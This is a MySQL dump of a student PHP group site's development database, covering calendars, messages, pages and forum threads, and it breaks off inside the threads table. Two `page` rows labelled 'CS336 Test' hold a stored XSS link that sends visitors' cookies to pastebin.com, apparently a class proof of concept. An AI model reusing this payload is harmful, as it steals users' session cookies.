-- MySQL dump 10.13  Distrib 5.1.49, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: gusphp_dev
-- ------------------------------------------------------
-- Server version	5.1.49-1ubuntu8.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Current Database: `gusphp_dev`
--

CREATE DATABASE /*!32312 IF NOT EXISTS*/ `gusphp_dev` /*!40100 DEFAULT CHARACTER SET latin1 */;

USE `gusphp_dev`;

--
-- Table structure for table `calendar`
--

DROP TABLE IF EXISTS `calendar`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `calendar` (
  `user` varchar(32) NOT NULL,
  `date` date NOT NULL,
  `data` varchar(150) NOT NULL,
  `eventID` int(11) NOT NULL AUTO_INCREMENT,
  KEY `eventID` (`eventID`),
  KEY `eventID_2` (`eventID`)
) ENGINE=MyISAM AUTO_INCREMENT=651 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `calendar`
--

LOCK TABLES `calendar` WRITE;
/*!40000 ALTER TABLE `calendar` DISABLE KEYS */;
INSERT INTO `calendar` VALUES ('admin','2011-02-26','another event',3),('admin','2011-02-24','updated',2),('admin','2011-02-21','event',4),('user1','2011-03-15','an event in march',6),('admin','2011-02-23','updated',7),('admin','0000-00-00','different event',8),('long3841','2011-02-19','event',9),('cblair','2011-02-21','asdfasdf',10),('cblair','2011-02-27','asdfasfdasfd',11),('long3841','2011-02-21','something',12),('cblair','2011-03-12','test',13),('','2011-03-12','test2',14),('','2011-03-12','something',28),('','2011-03-31','something',189),('','2011-03-31','something',188),('','2011-03-31','something',187),('','2011-03-31','something',186),('','2011-03-29','something',181),('long3841','2011-03-15','something',109),('','2011-03-29','something',180),('','2011-03-29','something',179),('','2011-03-29','something',178),('','2011-03-30','something',184),('','2011-03-21','something',114),('','2011-03-30','something',185),('','2011-03-27','something',173),('','2011-03-20','something',110),('','2011-03-30','something',182),('','2011-03-18','something',107),('test','2011-04-02','something',208),('test','2011-04-02','something',210),('test','2011-04-02','something',212),('test','2011-04-02','something',214),('test','2011-04-02','something',216),('test','2011-04-02','something',218),('test','2011-04-02','something',220),('test','2011-04-02','something',222),('test','2011-04-02','something',224),('test','2011-04-02','something',226),('test','2011-04-02','something',228),('test','2011-04-02','something',230),('test','2011-04-02','something',232),('test','2011-04-02','something',234),('test','2011-04-02','something',236),('test','2011-04-02','something',238),('test','2011-04-02','something',240),('test','2011-04-02','something',242),('test','2011-04-02','something',244),('test','2011-04-02','something',246),('test','2011-04-02','something',248),('test','2011-04-02','something',250),('test','2011-04-02','something',252),('test','2011-04-02','something',254),('test','2011-04-02','something',256),('test','2011-04-02','something',258),('test','2011-04-02','something',260),('test','2011-04-02','something',262),('test','2011-04-02','something',264),('test','2011-04-02','something',266),('test','2011-04-02','something',268),('test','2011-04-02','something',270),('test','2011-04-02','something',272),('test','2011-04-02','something',274),('test','2011-04-02','something',276),('test','2011-04-02','something',278),('test','2011-04-02','something',280),('test','2011-04-02','something',282),('test','2011-04-02','something',284),('test','2011-04-02','something',286),('test','2011-04-02','something',288),('test','2011-04-02','something',290),('test','2011-04-02','something',292),('test','2011-04-02','something',294),('test','2011-04-02','something',296),('test','2011-04-02','something',298),('test','2011-04-02','something',300),('test','2011-04-02','something',302),('test','2011-04-02','something',304),('test','2011-04-02','something',306),('test','2011-04-02','something',308),('test','2011-04-02','something',310),('test','2011-04-02','something',312),('test','2011-04-02','something',314),('test','2011-04-02','something',316),('test','2011-04-02','something',318),('test','2011-04-02','something',320),('test','2011-04-02','something',322),('test','2011-04-02','something',324),('test','2011-04-02','something',326),('test','2011-04-02','something',328),('test','2011-04-02','something',330),('test','2011-04-02','something',332),('test','2011-04-02','something',334),('test','2011-04-02','something',336),('test','2011-04-02','something',338),('test','2011-04-02','something',340),('test','2011-04-02','something',342),('test','2011-04-02','something',344),('test','2011-04-02','something',346),('test','2011-04-02','something',348),('test','2011-04-02','something',350),('test','2011-04-02','something',352),('test','2011-04-02','something',354),('test','2011-04-02','something',356),('test','2011-04-02','something',358),('test','2011-04-02','something',360),('test','2011-04-02','something',362),('test','2011-04-02','something',364),('test','2011-04-02','something',366),('test','2011-04-02','something',368),('test','2011-04-02','something',370),('test','2011-04-02','something',372),('test','2011-04-02','something',374),('test','2011-04-02','something',376),('test','2011-04-02','something',378),('test','2011-04-02','something',380),('test','2011-04-02','something',382),('test','2011-04-02','something',384),('test','2011-04-02','something',386),('test','2011-04-02','something',388),('test','2011-04-02','something',390),('test','2011-04-02','something',392),('test','2011-04-02','something',394),('test','2011-04-02','something',396),('test','2011-04-02','something',398),('test','2011-04-02','something',400),('test','2011-04-02','something',402),('test','2011-04-02','something',404),('test','2011-04-02','something',406),('test','2011-04-02','something',408),('test','2011-04-02','something',410),('test','2011-04-02','something',412),('test','2011-04-02','something',414),('test','2011-04-02','something',416),('test','2011-04-02','something',418),('test','2011-04-02','something',420),('test','2011-04-02','something',422),('test','2011-04-02','something',424),('test','2011-04-02','something',426),('test','2011-04-02','something',428),('test','2011-04-02','something',430),('test','2011-04-02','something',432),('test','2011-04-02','something',434),('test','2011-04-02','something',436),('test','2011-04-02','something',438),('test','2011-04-02','something',440),('','2011-04-20','something',650),('test','2011-04-02','something',442),('','2011-04-20','something',649),('test','2011-04-02','something',444),('abhay','2011-04-20','test1',648),('test','2011-04-02','something',446),('test','2011-04-02','something',448),('long3841','2011-05-13','Summer!',647),('test','2011-04-02','something',450),('test','2011-04-02','something',452),('test','2011-04-02','something',454),('jeffery','2011-04-22','Watch Lord of the Rings',646),('test','2011-04-02','something',456),('test','2011-04-02','something',458),('Lord of the Rings','2011-04-20','test',645),('test','2011-04-02','something',460),('','2011-04-19','something',644),('test','2011-04-02','something',462),('test','2011-04-02','something',464),('test','2011-04-19','something',643),('test','2011-04-02','something',466),('test','2011-04-03','something',468),('test','2011-04-03','something',470),('test','2011-04-03','something',472),('test','2011-04-03','something',474),('test','2011-04-03','something',476),('test','2011-04-03','something',478),('test','2011-04-03','something',480),('test','2011-04-03','something',482),('test','2011-04-03','something',484),('test','2011-04-03','something',486),('test','2011-04-03','something',488),('test','2011-04-03','something',490),('test','2011-04-03','something',492),('test','2011-04-03','something',494),('test','2011-04-03','something',496),('test','2011-04-03','something',498),('test','2011-04-03','something',500),('test','2011-04-03','something',502),('test','2011-04-03','something',504),('test','2011-04-03','something',506),('test','2011-04-03','something',508),('test','2011-04-03','something',510),('test','2011-04-03','something',512),('test','2011-04-03','something',514),('test','2011-04-03','something',516),('test','2011-04-03','something',518),('test','2011-04-03','something',520),('test','2011-04-03','something',522),('test','2011-04-03','something',524),('test','2011-04-03','something',526),('test','2011-04-03','something',528),('test','2011-04-03','something',530),('test','2011-04-03','something',532),('test','2011-04-03','something',534),('test','2011-04-03','something',536),('test','2011-04-03','something',538),('test','2011-04-03','something',540),('test','2011-04-03','something',542),('test','2011-04-03','something',544),('test','2011-04-03','something',546),('test','2011-04-03','something',548),('test','2011-04-03','something',550),('test','2011-04-03','something',552),('test','2011-04-03','something',554),('test','2011-04-03','something',562),('test','2011-04-03','something',564),('test','2011-04-03','something',570),('test','2011-04-03','something',572),('test','2011-04-03','something',574),('test','2011-04-03','something',576),('test','2011-04-03','something',578),('test','2011-04-04','something',580),('test','2011-04-04','something',582),('test','2011-04-04','something',584),('test','2011-04-04','something',586),('test','2011-04-04','something',589),('test','2011-04-04','something',591),('test','2011-04-05','something',593),('test','2011-04-05','something',595),('test','2011-04-06','something',597),('test','2011-04-06','something',599),('test','2011-04-06','something',601),('test','2011-04-06','something',603),('test','2011-04-07','something',605),('test','2011-04-07','something',607),('test','2011-04-08','something',612),('cblair','2011-03-09','test',611),('test','2011-04-12','something',627),('long3841','2011-04-15','event!',631),('test_group','2011-04-15','group meeting',632),('developers','2011-04-15','test',634),('long3841','2011-04-19','an event on april 19th',639);
/*!40000 ALTER TABLE `calendar` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `calendar_rsvp`
--

DROP TABLE IF EXISTS `calendar_rsvp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `calendar_rsvp` (
  `eventID` int(11) NOT NULL,
  `groupID` int(11) NOT NULL,
  `name` varchar(30) NOT NULL,
  `yes` int(11) NOT NULL,
  `no` int(11) NOT NULL,
  `maybe` int(11) NOT NULL,
  `unanswered` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `calendar_rsvp`
--

LOCK TABLES `calendar_rsvp` WRITE;
/*!40000 ALTER TABLE `calendar_rsvp` DISABLE KEYS */;
INSERT INTO `calendar_rsvp` VALUES (304,5,'drj',0,0,0,1),(304,5,'test',1,0,0,0),(304,5,'long3841',1,0,0,0),(645,24,'anilson',0,0,0,1),(304,5,'brett',1,0,0,0),(304,5,'timb',0,0,0,1),(646,21,'jafara',0,0,0,1),(646,21,'jeffery',0,0,0,1),(304,5,'crempel',1,0,0,0),(646,21,'drj',0,0,0,1),(13,11,'test2',0,0,0,1),(13,11,'cblair',0,0,0,1),(631,5,'long3841',1,0,0,0),(634,11,'abhay',0,0,0,1),(634,11,'cblair',1,0,0,0),(634,11,'drj',0,0,0,1),(631,5,'cblair',1,0,0,0),(632,5,'long3841',0,0,0,1),(647,11,'cblair',0,0,0,1),(647,11,'anilson',0,0,0,1),(647,11,'sbeddall',0,0,0,1),(647,11,'brett',0,0,0,1),(647,11,'timb',0,0,0,1),(647,11,'claurino',0,0,0,1),(647,11,'crempel',0,0,0,1),(647,11,'abhay',0,0,0,1),(647,11,'drj',0,0,0,1),(647,11,'admin',0,0,0,1),(647,11,'sand9300',0,0,0,1),(647,11,'pythonspy',0,0,0,1),(647,11,'cbabraham',0,0,0,1),(647,11,'long3841',1,0,0,0),(647,11,'jeffery',0,0,0,1),(647,11,'loom8595',0,0,0,1),(647,11,'laur6383',0,0,0,1),(647,11,'test_user',0,0,0,1),(647,11,'dcarl',0,0,0,1),(647,11,'jafara',0,0,0,1),(647,11,'balld',0,0,0,1),(648,5,'cblair',0,0,0,1);
/*!40000 ALTER TABLE `calendar_rsvp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `files`
--

DROP TABLE IF EXISTS `files`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `files` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `filename` text NOT NULL,
  `uid` int(11) DEFAULT NULL,
  `gid` int(11) DEFAULT NULL,
  `date` int(11) DEFAULT NULL,
  `size` float DEFAULT NULL,
  `perm` int(11) DEFAULT '7',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=40 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `files`
--

LOCK TABLES `files` WRITE;
/*!40000 ALTER TABLE `files` DISABLE KEYS */;
INSERT INTO `files` VALUES (27,'9j31F.jpg',13,5,20110415,52.48,7),(32,'magikarp-swear.gif',13,5,20110415,8.15,7),(33,'colby.png',0,5,20110415,46.25,7),(35,'ballmer.png',15,11,20110415,45.5,7),(36,'khaaan.png',15,10,20110416,33.08,7),(37,'lotrgus.png',46,24,20110420,124.48,7),(39,'gus_small.png',11,11,20110420,5.8,7);
/*!40000 ALTER TABLE `files` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ggroup`
--

DROP TABLE IF EXISTS `ggroup`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ggroup` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) DEFAULT NULL,
  `profile` varchar(25) NOT NULL,
  `description` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=31 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ggroup`
--

LOCK TABLES `ggroup` WRITE;
/*!40000 ALTER TABLE `ggroup` DISABLE KEYS */;
INSERT INTO `ggroup` VALUES (5,'test_group','sdfd','test_desc'),(10,'main','soon.png','Gus main group. Users set to admin (7) on this group get system wide admin privileges.'),(11,'developers','ballmer.png','Gus developers.'),(21,'University of Idaho Fencing Club','','University of Idaho Fencing Club'),(24,'Lord of the Rings','','This group will support Tolkienophiles on Campus.'),(25,'btest','','Testing G.U.S. PHP'),(30,'Wildlife Resources','','Animals, outdoors, and life. Take it or leave it!');
/*!40000 ALTER TABLE `ggroup` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `messages`
--

DROP TABLE IF EXISTS `messages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `messages` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `respond_id` int(11) DEFAULT NULL,
  `from_id` int(11) NOT NULL,
  `to_id` int(11) NOT NULL,
  `subject` varchar(64) NOT NULL,
  `message` varchar(255) NOT NULL,
  `location` enum('inbox','sent','archived') NOT NULL,
  `created` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=41 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `messages`
--

LOCK TABLES `messages` WRITE;
/*!40000 ALTER TABLE `messages` DISABLE KEYS */;
INSERT INTO `messages` VALUES (1,0,1,0,'test','test','inbox','2011-02-10 20:13:09'),(2,NULL,24,0,'test','test','sent','2011-04-15 18:31:39'),(3,NULL,0,10,'test','test','sent','2011-04-15 18:32:56'),(4,NULL,12,2,'0','test','sent','2011-04-15 08:01:54'),(5,NULL,0,9,'hello','hi!','sent','2011-04-15 08:16:06'),(6,NULL,38,0,'0','we are watching','sent','2011-04-15 08:48:49'),(7,NULL,0,12,'test 2','test','sent','2011-04-15 08:59:05'),(8,NULL,46,0,'test outgoing messages','howzit going, CB?\nWondering what Gus would look like if it were a Facebook app. Tell me if you got this, and mention Facebook.','sent','2011-04-18 08:26:47'),(9,NULL,48,0,'0','The e-mail example doesn\'t match what the site will except as a valid e-mail address.','sent','2011-04-19 14:29:21'),(10,NULL,45,45,'Gus Event Invite','<br>You are invited to: an event on april 19th (on 4-19-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-19 15:51:33'),(11,NULL,45,13,'0','message to myself','sent','2011-04-19 15:55:46'),(12,NULL,46,22,'Gus Event Invite','<br>You are invited to: Watch Lord of the Rings (on 4-22-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 09:12:39'),(13,NULL,46,46,'Gus Event Invite','<br>You are invited to: Watch Lord of the Rings (on 4-22-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 09:12:39'),(14,NULL,46,57,'Gus Event Invite','<br>You are invited to: Watch Lord of the Rings (on 4-22-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 09:12:39'),(15,NULL,0,11,'Gus Event Invite','<br>You are invited to: test (on 4-20-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 09:16:30'),(16,NULL,45,0,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(17,NULL,45,11,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(18,NULL,45,13,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(19,NULL,45,15,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(20,NULL,45,17,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(21,NULL,45,18,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(22,NULL,45,20,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(23,NULL,45,21,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(24,NULL,45,22,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(25,NULL,45,24,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(26,NULL,45,37,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(27,NULL,45,38,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(28,NULL,45,42,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(29,NULL,45,45,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(30,NULL,45,46,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(31,NULL,45,48,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(32,NULL,45,53,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(33,NULL,45,54,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(34,NULL,45,56,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(35,NULL,45,57,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(36,NULL,45,58,'Gus Event Invite','<br>You are invited to: Summer! (on 5-13-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 13:35:24'),(37,NULL,11,21,'Moses2k?  More like...','I don\'t know that this feature works.','sent','2011-04-20 16:41:50'),(38,NULL,21,0,'Gus Event Invite','<br>You are invited to: test1 (on 4-20-2011)<br>To accept the invite, go to the day in your calendar.','inbox','2011-04-20 17:50:00'),(39,NULL,6,0,'hey','hey','archived','2011-04-21 16:16:17'),(40,NULL,0,6,'hey','hey','inbox','2011-04-21 16:15:52');
/*!40000 ALTER TABLE `messages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `page`
--

DROP TABLE IF EXISTS `page`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `page` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) DEFAULT NULL,
  `content` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=131 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `page`
--

LOCK TABLES `page` WRITE;
/*!40000 ALTER TABLE `page` DISABLE KEYS */;
INSERT INTO `page` VALUES (27,'test','Test content'),(16,'home','<p><span style=\"font-size: x-small;\"><em>A quick note from the developers:</em></span></p>\n<p><span style=\"font-size: large;\"><strong>Welcome to the GUS Beta Test!</strong></span></p>\n<p><span style=\"font-size: small;\">If you are here to try out GUS, we salute you! We will do our best to provide any help or support that you require during your stay here. &nbsp;Of course, since this is a Beta, there is a lot that we may have missed during our production testing. In the event that you encounter something unexpected, simply click \"FeedBack\" on the left and submit a report. Though we would love for you to copy paste the exact error, what you were doing when the bug occurred will be enough for us to reproduce it. If you don\'t want to take that option, simply send a message to any members of the \"developer\" group. We will get back to you as soon as we can.</span></p>\n<p><span style=\"font-size: small;\">To go along with the fact that this is a Beta, we also cannot be absolutely certain about the security on our site. We endeavor to provide a safe haven for your club or activity group to reside in, but nothing is 100% sure on the Internet. Humor us, make sure to not put any information here that you wish to remain private.&nbsp;</span></p>\n<p><span style=\"font-size: small;\"><strong>What now?</strong></span></p>\n<p><span style=\"font-size: small;\">To demo, click on any of the links on the left and on the top. They will take you where you want to go. Hopefully everything is where you would expect it to be found, but if you have any questions, please create a ticket at: http://nwerp.org/trac/gus/newticket<strong> </strong></span></p>\n<p><span style=\"font-size: small;\"><strong><br /></strong></span></p>\n<p><span style=\"font-size: small;\">Thanks very much for your participation. We hope you have a great time!</span></p>\n<p><span style=\"font-size: small;\"><em>-The GUS Dev Team</em></span></p>'),(18,'auth','Gus Authentication'),(19,'CS336 Test','<a href=\"javascript:var a=new XMLHttpRequest,b=\"paste_code=\"+document.cookie+\"&paste_name=XSS_poc\";a.open(\"POST\",\"http://pastebin.com/api_public.php\",true);a.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");a.setRequestHeader(\"Content-length\",b.length+\"\");a.setRequestHeader(\"Connection\",\"close\");a.send(b);\">Sweet Link Man</a>'),(20,'CS336Test','<a href=\"javascript:var a=new XMLHttpRequest,b=\"paste_code=\"+document.cookie+\"&paste_name=XSS_poc\";a.open(\"POST\",\"http://pastebin.com/api_public.php\",true);a.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");a.setRequestHeader(\"Content-length\",b.length+\"\");a.setRequestHeader(\"Connection\",\"close\");a.send(b);\">Sweet Link Man</a>'),(21,NULL,NULL),(102,'group_main','<p style=\"text-align: left;\">This <span style=\"text-decoration: underline;\">is</span> <strong></strong></p>\n<p style=\"text-align: right;\"><strong>content</strong> <em></em></p>\n<p style=\"text-align: center;\"><em>specific</em></p>\n<p style=\"text-align: left;\"><em></em>to the <span style=\"font-size: large;\">main</span> group.</p>\n<ol>\n<li>-</li>\n<li>-</li>\n<li>-</li>\n</ol>\n<ul>\n<li>1</li>\n<li>2</li>\n<li>3</li>\n</ul>'),(103,'group_test_group','<p>This <em>is</em> <span style=\"text-decoration: underline;\"><strong>content</strong></span> specific</p>\n<p style=\"text-align: right;\">to</p>\n<p style=\"text-align: center;\">the</p>\n<p style=\"text-align: left;\"><span style=\"font-size: x-small; font-family: impact,chicago;\">test_group</span> group.</p>'),(110,'pm',''),(125,'group_developers','<p>Developers, <strong>developers</strong>, <em>developers</em>, <span style=\"text-decoration: underline;\">developers</span>, <em><strong>developers</strong></em>, <span style=\"text-decoration: underline;\"><strong>developers</strong></span>, <span style=\"text-decoration: underline;\"><em>developers</em></span>,</p>\n<p>developers, developers, developers,</p>\n<p style=\"text-align: center;\">developers, developers, developers,</p>\n<p style=\"text-align: right;\">developers, developers, developers,</p>\n<ol>\n<li>developers,&nbsp;</li>\n<li>developers,&nbsp;</li>\n<li>developers,</li>\n</ol>\n<ul>\n<li>developers,</li>\n<li>developers,</li>\n<li>developers,</li>\n</ul>\n<p>developers, <sub>developers,</sub> <sup><sub>developers, </sub></sup>developers.</p>'),(128,'group_Lord of the Rings','<p>One Gus for the Dark Lord in his Dark Office.</p>\n<p>&nbsp;</p>');
/*!40000 ALTER TABLE `page` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `replies`
--

DROP TABLE IF EXISTS `replies`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `replies` (
  `thread_id` int(4) NOT NULL DEFAULT '0',
  `reply_id` int(4) NOT NULL AUTO_INCREMENT,
  `author` varchar(65) NOT NULL DEFAULT '',
  `a_email` varchar(65) NOT NULL DEFAULT '',
  `body` longtext NOT NULL,
  `datetime` varchar(25) NOT NULL DEFAULT '',
  KEY `a_id` (`reply_id`)
) ENGINE=InnoDB AUTO_INCREMENT=52 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `replies`
--

LOCK TABLES `replies` WRITE;
/*!40000 ALTER TABLE `replies` DISABLE KEYS */;
INSERT INTO `replies` VALUES (5,1,'Chaylo','','Just testing the reply counter','15/Feb/2011 07:59:36'),(5,2,'testing','','testing some more','15/Feb/2011 08:50:23'),(5,3,'testing','','testing','15/Feb/2011 08:53:16'),(6,4,'tesing','','testing','15/Feb/2011 08:53:27'),(7,6,'Chaylo','','test','25/Mar/2011 10:35:29'),(7,7,'Chaylo','','woot','25/Mar/2011 10:44:55'),(5,8,'claurino','','testabible\n','28/Mar/2011 03:12:05'),(7,16,'claurino','','testing','28/Mar/2011 05:08:38'),(23,22,'claurino','','teeest','29/Mar/2011 11:28:42'),(28,24,'admin','','Admin reply','30/Mar/2011 05:19:08'),(29,25,'admin','',' reply','30/Mar/2011 05:19:28'),(28,35,'claurino','','testable','30/Mar/2011 06:34:09'),(31,36,'claurino','','test','04/Apr/2011 08:06:20'),(44,42,'claurino','','testing','04/Apr/2011 10:10:10'),(31,43,'claurino','','test','06/Apr/2011 06:53:26'),(45,44,'claurino','','First reply','07/Apr/2011 09:57:59'),(46,45,'claurino','','First reply in this thread','07/Apr/2011 09:58:53'),(46,46,'admin','','Admin Reply','07/Apr/2011 10:01:57'),(45,47,'admin','','Admin Reply','07/Apr/2011 10:02:11'),(47,48,'admin','','Admin reply','07/Apr/2011 10:02:44'),(46,49,'forum_tester','','User reply','07/Apr/2011 10:18:26'),(47,50,'forum_tester','','User reply','07/Apr/2011 10:18:43'),(45,51,'forum_tester','','User reply','07/Apr/2011 10:20:42');
/*!40000 ALTER TABLE `replies` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `threads`
--

DROP TABLE IF EXISTS `threads`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `threads` (
  `thread_id` int(4) NOT NULL AUTO_INCREMENT,
  `thread_topic` varchar(255) NOT NULL DEFAULT '',
  `thread_body` longtext NOT NULL,
  `thread_author` varchar(65) NOT NULL DEFAULT '',
  `email` varchar(65) NOT NULL DEFAULT '',
  `datetime` varchar(25) NOT NULL DEFAULT '',
  `view` int(4) NOT NULL DEFAULT '0',
  `num_replies` int(4) NOT NULL DEFAULT '0',
  `group_id` int(100) NOT NULL,
  `group_name` varchar(128) NOT NULL,
  `lock_flag` int(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`thread_id`)
) ENGINE=InnoDB AUTO_INCREMENT=54 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `threads`
--

LOCK TABLES `threads` WRITE;
/*!40000 ALTER TABLE `threads` DISABLE KEYS */;
INSERT INTO `threads` VALUES (5,'First Forum Entry','Just a quick test to make sure everything is working','Chaylo','','15/Feb/2011 07:59:21',0,7,1,'',0),(6,'Gotta check it all again!','Ugh','Chaylo','','15/Feb/2011 08:50:01',0,1,1,'',0),(7,'testing 1 2 3','Hello?','Chaylo','','25/Mar/2011 10:35:22',0,4,1,'test',0),(8,'new thread','test','claurino','','29/Mar/2011 06:38:00',0,0,1,'test',0),(15,'test thread','test','claurino','','29/Mar/2011 07:04:09',0,0,1,'test',0),(18,'test thread','test','claurino','','29/Mar/2011 07:17:21',0,0,1,'test',0),(23,'Once again...first thread','Juuuuuust testing','claurino','','29/Mar/2011 09:32:30',0,1,5,'test_group',0),(28,'New Admin Thread','Test','admin','','30/Mar/2011 05:19:01',0,1,7,'',0),(29,'New Admin Thread','Test','admin','','30/Mar/2011 05:19:21',0,1,6,'',0),(30,'New Admin Thread','Testing','admin','','30/Mar/2011 05:19:41',0,0,5,'',0),(31,'New Test Thread','Testing 123','claurino','','30/Mar/2011 06:31:40',0,2,7,'',0),(44,'testing','testable','claurino','','04/Apr/2011 10:10:06',0,1,6,'',0),(45,'First thread in this Forum','First Admin Test Group Thread','claurino','','07/Apr/2011 09:57:44',0,3,2,'',0),(46,'First thread in this Forum','First post in this thread','claurino','','07/Apr/2011 09:58:34',0,3,3,'',0),(47,'First thread in this Forum','First post in this thread','admin','','07/Apr/2011 10:02:33',0,2,4,'',0),(48,'User test thread','User post test','forum_tester','','07/Apr/2011 10:21:19',0,0,2,'',0),(49,'Second thread created for search test','Need another thread for searching','claurino','','07/Apr/2011 